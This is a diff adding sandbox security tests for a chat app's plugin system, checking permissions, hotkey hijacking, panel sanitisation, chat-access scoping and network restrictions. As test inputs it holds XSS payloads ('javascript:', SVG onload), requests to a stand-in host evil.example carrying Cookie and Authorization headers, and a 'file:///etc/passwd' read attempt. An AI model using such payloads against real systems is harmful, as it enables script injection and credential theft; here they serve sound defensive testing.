@@ -135,6 +135,183 @@ console.log('\n── Панель в приложении и музыка (v1.4
   })
 }
 
+console.log('\n── Новые возможности (v1.419.0) ──')
+{
+  // Каждая новая возможность — новый способ навредить, если она даётся без
+  // спроса. Проверяем ровно это: без разрешения ничего из добавленного не
+  // работает, а с разрешением — работает (иначе проверка ничего не значит).
+  const none = attacker([], 'no-perms-419')
+  await blocked('без права нельзя поставить горячую клавишу', () =>
+    none('ui.addHotkey', [{ combo: 'Ctrl+Shift+K', description: 'зло', onPress: fn }]))
+  await blocked('без права нельзя прочитать переписку', () => none('messages.recent', [20]))
+  await blocked('без права нельзя поставить реакцию', () => none('messages.react', ['m1', '👍']))
+  await blocked('без права нельзя удалить сообщение', () => none('messages.remove', ['m1']))
+  await blocked('без права нельзя увидеть список серверов', () => none('servers', []))
+  await blocked('без права нельзя увидеть каналы', () => none('channels', ['s1']))
+  await blocked('без права нельзя увести человека в другой канал', () => none('open', [{ serverId: 's1' }]))
+  await blocked('без права нельзя менять активность', () => none('status.set', ['я тут']))
+  await blocked('без права нельзя узнать активность', () => none('status.get', []))
+  await blocked('без права нет звука', () => none('sound.play', ['message']))
+  await blocked('без права нельзя вычистить хранилище', () => none('storage.clear', []))
+
+  const all = attacker([...ALL_PERMISSIONS], 'all-perms-419')
+  // Горячие клавиши: голая буква и одиночный Ctrl отняли бы у человека набор
+  // текста и привычные сочетания приложения — причём молча.
+  for (const combo of ['K', 'Ctrl+K', 'Shift+A', 'Ctrl', '', 'Ctrl+Shift']) {
+    await blocked(`сочетание «${combo || 'пусто'}» не принимается`, () =>
+      all('ui.addHotkey', [{ combo, description: 'з', onPress: fn }]))
+  }
+  await allowed('нормальное сочетание принимается', () =>
+    all('ui.addHotkey', [{ combo: 'Ctrl+Shift+K', description: 'проба', onPress: fn }]))
+  await check('чужое сочетание не перехватить', async () => {
+    const b = attacker([...ALL_PERMISSIONS], 'hk-thief')
+    try { await b('ui.addHotkey', [{ combo: 'Ctrl+Shift+K', description: 'подмена', onPress: fn }]); return false }
+    catch { return true }
+  })
+  await check('горячих клавиш не больше пяти на плагин', async () => {
+    const d = attacker([...ALL_PERMISSIONS], 'hk-flood')
+    let added = 0
+    for (const c of ['Ctrl+Alt+A', 'Ctrl+Alt+B', 'Ctrl+Alt+C', 'Ctrl+Alt+D', 'Ctrl+Alt+E', 'Ctrl+Alt+F', 'Ctrl+Alt+G']) {
+      try { await d('ui.addHotkey', [{ combo: c, description: 'x', onPress: fn }]); added++ } catch { /* предел */ }
+    }
+    return added <= 5
+  })
+
+  // Панель в чате — новое место; выдуманное по-прежнему не проходит.
+  await allowed('панель в чате ставится', () =>
+    all('ui.addPanel', [{ slot: 'chat', title: 'Уголок', rows: [] }]))
+
+  await check('в панель не проходит картинка с чужим протоколом', async () => {
+    await all('ui.addPanel', [{ slot: 'chat', title: 'Т', rows: [
+      { type: 'image', key: 'bad', label: 'зло', value: 'javascript:alert(1)' },
+      { type: 'image', key: 'bad2', label: 'зло', value: 'data:image/svg+xml,<svg onload=alert(1)>' },
+      { type: 'image', key: 'ok', label: 'норм', value: 'https://example.com/i.png' },
+    ] }])
+    const panel = registry.getRegistry().panels.find((x: any) => x.slot === 'chat' && x.pluginId === 'all-perms-419')
+    return !!panel && panel.rows.length === 1 && panel.rows[0].type === 'image'
+  })
+
+  await check('числа в строках приводятся к своим границам', async () => {
+    await all('ui.addPanel', [{ slot: 'library', title: 'Ч', rows: [
+      { type: 'progress', key: 'p', label: 'п', value: 1e9 },
+      { type: 'progress', key: 'p2', label: 'п2', value: NaN },
+      { type: 'slider', key: 's', label: 'с', value: 999, min: 0, max: 10, step: 1 },
+    ] }])
+    const panel = registry.getRegistry().panels.find((x: any) => x.slot === 'library' && x.pluginId === 'all-perms-419')
+    if (!panel) return false
+    const p = panel.rows.find((r: any) => r.key === 'p') as any
+    const p2 = panel.rows.find((r: any) => r.key === 'p2') as any
+    const s = panel.rows.find((r: any) => r.key === 's') as any
+    return p.value === 100 && p2.value === 0 && s.value === 10
+  })
+
+  await check('ползунок с перевёрнутыми границами отбрасывается', async () => {
+    // Своё же место (chat): панель этого плагина заменяется его новой, а не
+    // считается четвёртой в углу.
+    await all('ui.addPanel', [{ slot: 'chat', title: 'Г', rows: [
+      { type: 'slider', key: 'bad', label: 'плохо', value: 5, min: 10, max: 1, step: 1 },
+    ] }])
+    const panel = registry.getRegistry().panels.find((x: any) => x.slot === 'chat' && x.pluginId === 'all-perms-419')
+    return !!panel && panel.rows.length === 0
+  })
+
+  // Чат: без открытого чата читать и править нечего — отказ, а не тишина.
+  await blocked('без открытого чата нечего читать', () => all('messages.recent', [10]))
+  await blocked('без открытого чата некуда ставить реакцию', () => all('messages.react', ['m1', '👍']))
+  await blocked('пустой переход отвергается', () => all('open', [{}]))
+  await blocked('выдуманный звук не играет', () => all('sound.play', ['сирена']))
+}
+
+console.log('\n── Открытый чат: что можно и чего нельзя (v1.419.0) ──')
+{
+  // Мост регистрирует сам экран чата под id открытого разговора. Проверяем не
+  // отказы, а работу: чтение отдаёт то, что на экране, реакция проходит, чужое
+  // сообщение не удаляется, а чат, который сейчас не открыт, плагину недоступен
+  // вовсе — иначе «читаю открытый чат» означало бы «читаю любой».
+  const { setChatBridge } = await import('./chatApi')
+  const реакции: string[] = []
+  const удалено: string[] = []
+  const открытый = {
+    recent: (n: number) => [
+      { id: 'm1', author: 'я', authorName: 'Я', content: 'привет', mine: true, at: '2026-07-29T10:00:00Z' },
+      { id: 'm2', author: 'он', authorName: 'Он', content: 'о/', mine: false, at: '2026-07-29T10:01:00Z' },
+    ].slice(-n),
+    react: async (id: string, e: string) => { реакции.push(id + e); return null },
+    remove: async (id: string) => {
+      if (id !== 'm1') return 'Плагин может убрать только твоё сообщение.'
+      удалено.push(id); return null
+    },
+  }
+  setChatBridge('chat-open', открытый)
+  setChatBridge('chat-hidden', {
+    recent: () => [{ id: 'x', author: 'кто-то', authorName: 'Кто-то', content: 'тайна', mine: false, at: '' }],
+    react: async () => null, remove: async () => null,
+  })
+
+  const plugin: any = {
+    manifest: { id: 'chat-plug', name: 'Чат', version: '1.0.0', author: 'к', description: '', permissions: [...ALL_PERMISSIONS], hosts: [] },
+    code: '', enabled: true, installedAt: '', sourceUserId: null, storage: {},
+  }
+  upsertPlugin(plugin)
+  const d = createDispatcher(plugin, {
+    sendMessage: async () => {}, toast: () => {},
+    // Открыт именно chat-open — про chat-hidden плагин знать не должен.
+    channel: () => ({ id: 'chat-open', name: 'общий', serverId: 's1', serverName: 'С' }),
+  } as any, () => {})
+
+  await check('плагин читает открытый чат', async () => {
+    const got = await d('messages.recent', [10]) as any[]
+    return Array.isArray(got) && got.length === 2 && got[0].id === 'm1' && got[1].mine === false
+  })
+  await check('больше пятидесяти сообщений за раз не выдаётся', async () => {
+    let asked = 0
+    setChatBridge('chat-open', {
+      recent: (n: number) => { asked = n; return [] },
+      react: async () => null, remove: async () => null,
+    })
+    await d('messages.recent', [100000])
+    // Вернуть настоящий мост обязательно: иначе проверки ниже спрашивали бы
+    // эту заглушку и «прошли» бы, ничего не проверив.
+    setChatBridge('chat-open', открытый)
+    return asked <= 50
+  })
+  await check('чужой чат недоступен, даже зная его id', async () => {
+    // Никакого способа назвать другой чат у плагина нет: адресат берётся из
+    // того, что открыто, а не из его аргументов.
+    const got = await d('messages.recent', [10]) as any[]
+    return Array.isArray(got) && !got.some(m => m.content === 'тайна')
+  })
+  await allowed('реакция в открытом чате проходит', () => d('messages.react', ['m1', '👍']))
+  await blocked('чужое сообщение плагин не удалит', () => d('messages.remove', ['m2']))
+  await check('своё сообщение удаляется', async () => {
+    await d('messages.remove', ['m1'])
+    return удалено.includes('m1')
+  })
+  setChatBridge('chat-open', null)
+  setChatBridge('chat-hidden', null)
+  await blocked('закрылся чат — читать снова нечего', () => d('messages.recent', [10]))
+}
+
+console.log('\n── Сеть: чего по-прежнему нельзя (v1.419.0) ──')
+{
+  // Методов стало больше, заголовков тоже — тем важнее, что домен, протокол и
+  // свой же сервер остались закрытыми, а Cookie так и не проходит.
+  const d = attacker([...ALL_PERMISSIONS], 'net-419')
+  await blocked('чужой метод по-прежнему не пустят', () =>
+    d('net.fetch', ['https://evil.example/x', { method: 'TRACE' }]))
+  await check('Cookie не уходит с запросом', async () => {
+    let seen: any = null
+    const real = (globalThis as any).fetch
+    ;(globalThis as any).fetch = async (_u: string, init: any) => { seen = init; return { ok: true, status: 200, text: async () => 'ok' } }
+    await d('net.fetch', ['https://evil.example/x', { headers: { Cookie: 'sb-token=…', Authorization: 'Bearer мой' } }])
+    ;(globalThis as any).fetch = real
+    const keys = Object.keys(seen?.headers ?? {}).map(k => k.toLowerCase())
+    // Authorization теперь можно (свой ключ плагина), Cookie — нет, и куки
+    // самого приложения не подставляются: credentials omit.
+    return !keys.includes('cookie') && keys.includes('authorization') && seen.credentials === 'omit'
+  })
+}
+
 console.log('\n── События ──')
 {
   // v1.397.0: событий стало семь вместо одного. Опасность ровно в том, что новое
@@ -169,7 +346,9 @@ console.log('\n── Сеть ──')
   await blocked('к самому приложению ходить нельзя', () => d('net.fetch', ['https://ponoi.app/api']))
   await blocked('http без шифрования не пустят', () => d('net.fetch', ['http://evil.example/x']))
   await blocked('file:// не пустят', () => d('net.fetch', ['file:///etc/passwd']))
-  await blocked('чужой метод не пустят', () => d('net.fetch', ['https://evil.example/x', { method: 'DELETE' }]))
+  // v1.419.0: DELETE и PUT теперь разрешены (обычные методы чужих API), а вот
+  // всё остальное — по-прежнему нет.
+  await blocked('чужой метод не пустят', () => d('net.fetch', ['https://evil.example/x', { method: 'CONNECT' }]))
 }
 
 console.log('\n── Наводнение интерфейса ──')
